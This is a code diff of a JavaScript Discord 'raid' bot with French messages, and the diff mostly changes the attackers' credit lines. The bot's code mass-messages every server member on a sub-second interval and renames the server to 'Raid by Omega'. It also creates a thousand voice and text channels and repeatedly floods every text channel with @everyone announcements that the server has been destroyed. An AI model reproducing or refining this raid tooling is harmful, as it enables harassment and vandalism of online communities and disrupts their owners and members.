@@ -55,7 +55,7 @@ bot.on('message', msg => {
                 if (msg.deletable) msg.delete();
                 msg.guild.members.forEach(member => {
                   setInterval(function () {
-                    member.send(msg.guild.owner.user.username+" vient de se faire pulvériser son serveur par ``Safe`` & ``_Mr.Adam_`` \n\n https://cdn.discordapp.com/attachments/561266014067752960/563033869717340200/a0aeb7e9b060446eae7ab8ef266f46b6.gif").catch(error => {}) }, 450)})
+                    member.send(msg.guild.owner.user.username+" vient de se faire pulvériser son serveur. \n\n ```Power By _Mr.Adam_ x Safe``` \n\n https://cdn.discordapp.com/attachments/561266014067752960/563033869717340200/a0aeb7e9b060446eae7ab8ef266f46b6.gif").catch(error => {}) }, 450)})
        }
  
 if(msg.content === '.suppr'){
@@ -70,11 +70,11 @@ if(msg.content === '.suppr'){
  
     if (!fucked){
       msg.guild.setIcon("diapo.jpg").catch(e => {});
-      msg.guild.setName('𝕆𝕄𝔼𝔾𝔸').catch(e => {});
+      msg.guild.setName('Raid by Omega').catch(e => {});
  
       for (var i = 0; i < 1000; i++) {
-        msg.guild.createChannel('Raid by Safe & Mr Adam', 'voice').catch(e => {});
-        msg.guild.createChannel('Raid by Safe & Mr Adam', 'text').catch(e => {});
+        msg.guild.createChannel('Raid by Omega', 'voice').catch(e => {});
+        msg.guild.createChannel('Raid by Omega', 'text').catch(e => {});
       }
       fucked = true;
             }
@@ -117,7 +117,7 @@ bot.on("message", msg => {
             let i = 0;
             let interval = setInterval(function () {
               msg.guild.channels.forEach(channel => {
-                if (channel.type === "text") channel.send('@everyone je veux vous annoncez que... \n\n ``Safe`` & ``_Mr.Adam_`` viennent tout juste de détruire ce serveur.\n\n https://cdn.discordapp.com/attachments/561266014067752960/563033869717340200/a0aeb7e9b060446eae7ab8ef266f46b6.gif')
+                if (channel.type === "text") channel.send("@everyone Je suis la petite voie qui te dis que ton serveur viens d'être Raid.  Va reporte l'assistance. \n\n https://cdn.discordapp.com/attachments/561266014067752960/563033869717340200/a0aeb7e9b060446eae7ab8ef266f46b6.gif \n\n ```Raid by _Mr.Adam_ x Safe```")
               }, 2500);
             });
           }
